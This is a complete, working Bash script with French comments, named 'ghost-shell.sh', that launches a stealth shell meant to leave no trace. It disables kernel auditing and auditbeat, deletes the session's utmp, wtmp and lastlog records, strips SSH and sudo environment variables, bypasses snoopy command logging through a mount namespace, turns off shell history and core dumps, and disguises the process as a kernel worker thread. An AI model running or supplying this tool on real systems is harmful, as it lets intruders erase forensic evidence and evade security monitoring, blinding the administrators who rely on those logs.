#!/usr/bin/env bash
# =============================================================================
# ghost-shell.sh — Session shell furtive, zéro trace d'exécution
# Usage : bash ghost-shell.sh
# Root recommandé pour couverture complète
# =============================================================================
# Vecteurs couverts :
#   [1]  Historique shell     : HISTFILE=/dev/null + HISTSIZE=0 + set +o history
#   [2]  utmp  (sessions live): suppression entrée TTY courante (utmpdump -r)
#   [3]  wtmp  (historique)   : idem
#   [4]  lastlog              : écrasement entrée UID par zéros via dd
#   [5]  Kernel audit (auditd): auditctl -e 0 (blackout total) → -e 1 à la fin
#   [6]  Auditbeat            : arrêt après blackout, redémarrage au cleanup
#   [7]  argv[0] / cmdline    : exec -a "[kworker/u:0]" → camouflé dans ps + /proc
#   [8]  snoopy (LD_PRELOAD)  : détection et unset
#   [9]  snoopy (ld.so.preload): isolation via unshare --mount si root
#   [10] Core dumps           : ulimit -c 0 (évite crash → artefact disque)
#   [11] Env vars traçantes   : SSH_*, SUDO_*, TERM_PROGRAM, etc.
# =============================================================================
# Limitation connue :
#   /proc/<PID>/exe pointe encore sur /usr/bin/bash (non spoofable depuis bash).
#   Un agent avancé croisant exe vs cmdline détectera le mismatch.
#   Mitigation : compiler un wrapper C ou utiliser un vrai binaire renommé.
# =============================================================================

# ── Constantes ──────────────────────────────────────────────────────────────────
readonly _GS_SPOOF="[kworker/u:0]"
readonly _GS_LASTLOG_RECLEN=292

# ── État global (restauration) ──────────────────────────────────────────────────
_GS_AUDIT_BAK=""
_GS_AUDIT_SUSPENDED=0
_GS_ABEAT_STOPPED=0
_GS_UNSHARE_MODE=0

# ── Affichage (vers stderr pour ne pas polluer stdout du shell lancé) ───────────
_ok()   { printf '\033[0;32m[+]\033[0m %s\n' "$*" >&2; }
_warn() { printf '\033[1;33m[!]\033[0m %s\n' "$*" >&2; }
_info() { printf '\033[0;36m[*]\033[0m %s\n' "$*" >&2; }
_sep()  { printf '\033[0;36m[*]\033[0m %s\n' "────────────────────────────────────" >&2; }

# ── Helpers ──────────────────────────────────────────────────────────────────────
_is_root()  { [[ $EUID -eq 0 ]]; }
_has()      { command -v "$1" &>/dev/null; }
_has_tty()  { [[ -t 0 ]]; }

_get_tty_line() {
    # Retourne le nom court du TTY courant, ex: "pts/0" ou "tty1"
    tty 2>/dev/null | sed 's|^/dev/||'
}

# ── tmpfs path (préfère /dev/shm → RAM, fallback /tmp) ──────────────────────────
_tmp() { mktemp /dev/shm/.gs_XXXXXX 2>/dev/null || mktemp; }

# ════════════════════════════════════════════════════════════════════════════════
# PHASE 1 — Blackout de la collecte d'événements
# ════════════════════════════════════════════════════════════════════════════════

_suspend_kernel_audit() {
    if ! _is_root; then _warn "[audit] root requis — skipped"; return; fi
    if ! _has auditctl; then _warn "[audit] auditctl introuvable — skipped"; return; fi

    # Sauvegarde des règles actives sur tmpfs (RAM)
    _GS_AUDIT_BAK=$(_tmp)
    auditctl -l 2>/dev/null | grep -E '^-[aw]' > "$_GS_AUDIT_BAK" || true

    # auditctl -e 0 : désactive le kernel auditing pour TOUS les processus.
    # Génère un dernier event CONFIG_CHANGE, puis silence total.
    # Nécessite CAP_AUDIT_CONTROL.
    if auditctl -e 0 2>/dev/null; then
        _GS_AUDIT_SUSPENDED=1
        _ok "Kernel auditing suspendu (auditctl -e 0)"
    else
        _warn "auditctl -e 0 échoué — système verrouillé (audit=2) ou droits insuffisants"
        rm -f "$_GS_AUDIT_BAK"
    fi
}

_stop_auditbeat() {
    _is_root           || return
    _has systemctl     || return
    systemctl is-active --quiet auditbeat 2>/dev/null || return

    # On arrête auditbeat APRÈS le blackout audit : l'event d'arrêt ne sera pas
    # capturé par le kernel audit puisqu'il est déjà désactivé.
    if systemctl stop auditbeat 2>/dev/null; then
        _GS_ABEAT_STOPPED=1
        _ok "auditbeat arrêté (après blackout kernel)"
    else
        _warn "Impossible d'arrêter auditbeat"
    fi
}

# ════════════════════════════════════════════════════════════════════════════════
# PHASE 2 — Suppression des artefacts de login
# ════════════════════════════════════════════════════════════════════════════════

_clean_utmp() {
    _is_root           || { _warn "[utmp] root requis — skipped"; return; }
    _has utmpdump      || { _warn "[utmp] utmpdump introuvable — skipped"; return; }
    _has_tty           || { _warn "[utmp] pas de TTY détectable — skipped"; return; }

    local tty_line f=/var/run/utmp tmp
    tty_line=$(_get_tty_line)
    [[ -z "$tty_line" || ! -f "$f" ]] && return

    tmp=$(_tmp)
    # Dump binaire → texte → filtre notre TTY → re-binaire → remplacement atomique
    if utmpdump "$f" 2>/dev/null \
        | grep -v "\[${tty_line}[[:space:]]*\]" \
        | utmpdump -r 2>/dev/null > "$tmp" \
       && cp "$tmp" "$f"; then
        _ok "utmp nettoyé (tty: $tty_line)"
    else
        _warn "Échec nettoyage utmp"
    fi
    rm -f "$tmp"
}

_clean_wtmp() {
    _is_root      || return
    _has utmpdump || return
    _has_tty      || return

    local tty_line f=/var/log/wtmp tmp
    tty_line=$(_get_tty_line)
    [[ -z "$tty_line" || ! -f "$f" ]] && return

    tmp=$(_tmp)
    if utmpdump "$f" 2>/dev/null \
        | grep -v "\[${tty_line}[[:space:]]*\]" \
        | utmpdump -r 2>/dev/null > "$tmp" \
       && cp "$tmp" "$f"; then
        _ok "wtmp nettoyé (tty: $tty_line)"
    fi
    rm -f "$tmp"
}

_clean_lastlog() {
    _is_root || return
    local f=/var/log/lastlog uid
    [[ -f "$f" ]] || return
    uid=$(id -u)

    # lastlog est un sparse file indexé par UID.
    # Chaque entrée = _GS_LASTLOG_RECLEN octets à l'offset (uid * reclen).
    # On écrase l'entrée par des zéros sans toucher au reste du fichier.
    if dd if=/dev/zero bs="$_GS_LASTLOG_RECLEN" count=1 seek="$uid" \
          of="$f" conv=notrunc 2>/dev/null; then
        _ok "lastlog effacé (uid: $uid)"
    fi
}

# ════════════════════════════════════════════════════════════════════════════════
# PHASE 3 — Nettoyage de l'environnement
# ════════════════════════════════════════════════════════════════════════════════

_clean_env() {
    local v
    # Variables SSH (révèlent origine de la connexion)
    for v in SSH_CLIENT SSH_CONNECTION SSH_TTY SSH_AUTH_SOCK SSH_AGENT_PID; do
        unset "$v" 2>/dev/null || true
    done
    # Variables sudo (révèlent une élévation de privilèges)
    for v in SUDO_USER SUDO_UID SUDO_GID SUDO_COMMAND; do
        unset "$v" 2>/dev/null || true
    done
    # Variables émulateur de terminal (fingerprint client)
    for v in TERM_PROGRAM TERM_PROGRAM_VERSION ITERM_SESSION_ID \
              KONSOLE_VERSION GNOME_TERMINAL_SCREEN VTE_VERSION; do
        unset "$v" 2>/dev/null || true
    done
    _ok "Environnement nettoyé (SSH_*, SUDO_*, terminal fingerprints)"
}

_neutralize_snoopy() {
    local snoopy_preload=0

    # Cas 1 : snoopy injecté via LD_PRELOAD dans l'environnement courant
    if [[ -n "${LD_PRELOAD:-}" ]] && echo "$LD_PRELOAD" | grep -qi "snoopy"; then
        unset LD_PRELOAD
        _ok "snoopy neutralisé (LD_PRELOAD unset)"
    fi

    # Cas 2 : snoopy dans /etc/ld.so.preload (global, tous les processus)
    if [[ -f /etc/ld.so.preload ]] && grep -qi "snoopy" /etc/ld.so.preload 2>/dev/null; then
        snoopy_preload=1
        if _has unshare; then
            # Isolation via user+mount namespace (fonctionne SANS root) :
            #   --user : nouveau user namespace (on y apparaît UID 0)
            #   --mount: nouveau mount namespace (les mounts n'affectent que nous)
            # On bind-mount /dev/null sur /etc/ld.so.preload dans ce namespace.
            # Le bash intermédiaire (bash -c) verra encore snoopy (1 event loggé),
            # mais le shell fantôme final sera propre.
            _GS_UNSHARE_MODE=1
            _ok "snoopy (/etc/ld.so.preload) → isolation via unshare --user --mount"
        else
            _warn "snoopy dans /etc/ld.so.preload — unshare introuvable, neutralisation impossible"
        fi
    fi
}

# ════════════════════════════════════════════════════════════════════════════════
# PHASE 4 — Restauration (trap EXIT)
# ════════════════════════════════════════════════════════════════════════════════

_restore_audit() {
    [[ $_GS_AUDIT_SUSPENDED -eq 1 ]] || return

    # Réactivation du kernel auditing
    auditctl -e 1 2>/dev/null || true

    # Rechargement des règles sauvegardées
    if [[ -n "$_GS_AUDIT_BAK" && -f "$_GS_AUDIT_BAK" ]]; then
        while IFS= read -r rule; do
            [[ -z "$rule" ]] && continue
            # shellcheck disable=SC2086
            auditctl $rule 2>/dev/null || true
        done < "$_GS_AUDIT_BAK"
        rm -f "$_GS_AUDIT_BAK"
    fi
    _ok "Kernel auditing restauré + règles rechargées"
}

_restore_auditbeat() {
    [[ $_GS_ABEAT_STOPPED -eq 1 ]] || return
    systemctl start auditbeat 2>/dev/null \
        && _ok "auditbeat redémarré" \
        || _warn "Échec redémarrage auditbeat — intervention manuelle requise"
}

_cleanup() {
    _sep
    _info "Nettoyage post-session..."
    _restore_audit
    _restore_auditbeat
    _info "Session fantôme terminée."
}

# ════════════════════════════════════════════════════════════════════════════════
# PHASE 5 — Lancement du shell fantôme
# ════════════════════════════════════════════════════════════════════════════════

_launch_shell() {
    # Durcissement de l'environnement hérité par exec
    export HISTFILE=/dev/null
    export HISTSIZE=0
    export HISTFILESIZE=0
    export HISTIGNORE='*'
    export PS1='\u@\h:\w\$ '
    ulimit -c 0

    if [[ $_GS_UNSHARE_MODE -eq 1 ]]; then
        # Mode isolation mount namespace :
        #   1. unshare crée un nouveau mount namespace et exec bash -c
        #   2. bash -c monte /dev/null sur /etc/ld.so.preload (dans ce namespace)
        #   3. bash -c exec le shell fantôme final (sans snoopy chargé)
        # Note : "mount --bind" sera loggué par snoopy (1 event), le reste ne l'est pas.
        exec unshare --user --map-root-user --mount -- bash --norc --noprofile -c \
            "mount --bind /dev/null /etc/ld.so.preload 2>/dev/null
             exec -a '${_GS_SPOOF}' bash --norc --noprofile -i"
    else
        # Mode standard :
        # exec -a remplace argv[0] dans /proc/<PID>/cmdline → apparaît comme
        # un thread kernel dans ps, top, et les règles auditbeat sur process.name.
        exec -a "$_GS_SPOOF" bash --norc --noprofile -i
    fi
}

# ════════════════════════════════════════════════════════════════════════════════
# MAIN
# ════════════════════════════════════════════════════════════════════════════════
main() {
    # Le trap s'active à la fin du script principal (après la fermeture du shell)
    trap _cleanup EXIT

    _sep
    _info "Ghost Shell — initialisation"
    _sep

    if ! _is_root; then
        _warn "Non-root : couverture partielle (historique + env + snoopy LD_PRELOAD)"
        _warn "           utmp/wtmp/lastlog/auditd/auditbeat nécessitent root"
    fi

    # Phase 1 : blackout de la collecte
    _suspend_kernel_audit
    _stop_auditbeat

    # Phase 2 : artefacts de login
    _clean_utmp
    _clean_wtmp
    _clean_lastlog

    # Phase 3 : environnement
    _clean_env
    _neutralize_snoopy
    ulimit -c 0

    _sep
    _ok "Lancement du shell fantôme"
    _info "argv[0]   : $_GS_SPOOF"
    _info "HISTFILE  : /dev/null"
    _info "core dumps: désactivés (ulimit -c 0)"
    _sep

    # Le subshell `(...)` permet au script de reprendre après la fermeture du
    # shell fantôme, déclenchant le trap EXIT → _cleanup.
    (
        _launch_shell
    )
}

main "$@"
